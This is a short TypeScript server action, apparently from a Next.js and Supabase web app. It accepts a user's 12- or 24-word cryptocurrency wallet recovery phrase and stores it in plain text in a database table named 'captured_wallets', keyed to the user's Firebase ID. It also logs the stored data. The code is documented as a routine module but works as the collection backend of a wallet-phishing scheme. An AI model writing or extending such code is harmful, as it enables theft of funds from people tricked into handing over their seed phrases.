'use server';
/**
 * @fileOverview A server action to capture and store a user's recovery phrase.
 *
 * - capturePhrase - A function that saves the recovery phrase to the database.
 * - CapturePhraseInput - The input type for the capturePhrase function.
 */
import { supabase } from '@/lib/supabase';
import { z } from 'zod';

const CapturePhraseInputSchema = z.object({
  phrase: z.string().describe('The 12 or 24-word recovery phrase.'),
  walletType: z.string().describe('The type of wallet being connected.'),
  firebase_uid: z.string().describe('The Firebase UID of the logged-in user.'),
});

export type CapturePhraseInput = z.infer<typeof CapturePhraseInputSchema>;

export async function capturePhrase(
  input: CapturePhraseInput
): Promise<{success: boolean}> {
    const validation = CapturePhraseInputSchema.safeParse(input);
    if (!validation.success) {
        console.error("Invalid input for capturePhrase:", validation.error);
        return { success: false };
    }

  const { phrase, walletType, firebase_uid } = validation.data;

  console.log('Updating wallet info for user:', firebase_uid);

  const { data, error } = await supabase
    .from('captured_wallets')
    .update({
        recovery_phrase: phrase,
        wallet_type: walletType,
    })
    .eq('firebase_uid', firebase_uid)
    .select();

  if (error) {
    console.error('Error updating Supabase record:', error);
    return { success: false };
  }

  console.log('Successfully updated wallet info in Supabase:', data);
  return { success: true };
}
